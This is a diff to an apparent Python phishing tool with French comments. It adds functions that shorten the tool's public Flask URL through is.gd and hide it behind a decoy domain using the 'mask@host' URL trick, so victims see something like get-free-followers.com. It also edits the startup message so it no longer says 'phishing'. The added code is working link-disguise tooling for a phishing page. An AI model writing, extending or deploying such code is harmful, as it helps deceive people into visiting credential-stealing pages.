@@ -80,6 +80,48 @@ def start_flask():
     print(f"{GREEN}[+] Démarrage du serveur Flask...{RESET}")
     app.run(host="0.0.0.0", port=8080, debug=False)  # Désactiver le mode debug pour éviter les redémarrages
 
+# set mask----------------------------------------
+
+def shorten_url(url):
+    """
+    Raccourcit une URL en utilisant le service is.gd.
+    :param url: L'URL originale (ex: https://example.com)
+    :return: L'URL raccourcie ou None si le service échoue
+    """
+    service = "https://is.gd/create.php?format=simple&url="  # Service is.gd
+
+    try:
+        # Envoyer une requête au service de raccourcissement
+        response = requests.get(f"{service}{url}")
+        if response.status_code == 200:
+            # Retourner l'URL raccourcie
+            return response.text.strip()
+        else:
+            print(f"{RED}Erreur avec {service} : Code d'état {response.status_code}{RESET}")
+    except requests.exceptions.RequestException as e:
+        print(f"{RED}Erreur avec {service} : {e}{RESET}")
+
+    # Si le service échoue
+    print("{RED}Le service de raccourcissement d'URL is.gd a échoué.{RESET}")
+    return None
+
+# applique le mask
+
+def apply_custom_mask(url, mask):
+    """
+    Applique un masque personnalisé à une URL.
+    :param url: L'URL originale (ex: https://example.com)
+    :param mask: Le masque personnalisé (ex: https://get-free-followers.com)
+    :return: L'URL masquée
+    """
+    # Supprimer le protocole (http:// ou https://) de l'URL et du masque
+    clean_url = url.replace("http://", "").replace("https://", "")
+    clean_mask = mask.replace("http://", "").replace("https://", "")
+
+    # Combiner le masque et l'URL
+    masked_url = f"https://{clean_mask}@{clean_url}"
+    return masked_url
+
 
 # Fonction principale
 def main():
@@ -88,7 +130,22 @@ def main():
 
     if public_url:
         # Afficher le lien public
-        print(f"{GREEN}[+] Votre page de phishing est accessible à l'adresse : {CYAN}{public_url}{RESET}")
+        print(f"{GREEN}[+] Votre page est accessible à l'adresse : {CYAN}{public_url}{RESET}")
+
+        # Raccourcir l'URL avec le service is.gd
+        shortened_url = shorten_url(public_url)
+        if not shortened_url:
+            print("Impossible de raccourcir l'URL. Utilisation de l'URL originale.")
+            shortened_url = public_url
+
+        # Demander à l'utilisateur le masque personnalisé
+        mask = input(f"{GREEN}Entrez le masque personnalisé (ex: https://get-free-followers.com) : {RESET}").strip()
+
+        # Appliquer le masque
+        masked_url = apply_custom_mask(shortened_url, mask)
+
+        # Afficher le lien public masked
+        print(f"{GREEN}[+] Votre lien raccourcir est accessible à l'adresse : {CYAN}{masked_url}{RESET}")
 
         # Démarrer le serveur Flask
         start_flask()
